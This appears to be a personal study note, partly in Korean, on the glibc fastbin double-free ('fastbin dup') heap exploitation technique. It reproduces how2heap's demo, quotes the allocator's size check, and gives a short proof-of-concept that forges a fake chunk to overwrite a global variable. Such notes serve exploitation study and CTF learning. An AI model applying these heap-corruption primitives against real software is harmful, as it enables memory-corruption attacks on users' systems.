---
layout: post
type: note
title: fastbin dup
alias: Heap
published : false
---

how2heap fastbin_dup.c

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "This file demonstrates a simple double-free attack with fastbins.\n");

	fprintf(stderr, "Allocating 3 buffers.\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	fprintf(stderr, "Freeing the first one...\n");
	free(a);

	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	fprintf(stderr, "So, instead, we'll free %p.\n", b);
	free(b);

	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);

	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
	fprintf(stderr, "1st malloc(8): %p\n", malloc(8));
	fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
	fprintf(stderr, "3rd malloc(8): %p\n", malloc(8));
}
```

malloc을 3번해준 후 double free를 해준다. 그러면 1st malloc(8)과 3rd malloc(8)이 같은 힙 영역을 가르키게 된다.

fake chunk를 구성해줘야 하는 이유 - 사이즈 검사

```c
/* Get size, ignoring use bits */
#define chunksize(p)         ((p)->size & ~(SIZE_BITS))
idx = fastbin_index (nb);
...
if (victim != 0)
{
    if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
    {
        errstr = "malloc(): memory corruption (fast)";
        errout:
           malloc_printerr (check_action, errstr, chunk2mem (victim), av);
           return NULL;
    }
}
```

fake chunk를 구성할 수 있고 fastbin을 할당 해제를 할 수 있다면 fastbin dup을 이용해서 exploit하면 된다. double free에 대해 이해가 필요하다.

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

long win;

int main(){
	*(&win - 1) = 0x31; // fake chunk size
	long *ptr = malloc(32);
	long *ptr2 = malloc(32);
	
	free(ptr);
	free(ptr2);
	free(ptr);

	ptr = malloc(32);
	ptr2 = malloc(32);
	ptr[0] = &win - 2;

	long *ptr3 = malloc(32);
	long *ptr4 = malloc(32); // point -> ptr[0] address(win)

	ptr4[0] = 1; 

	if(win)
		puts("!");
  
	return 0;
}
```

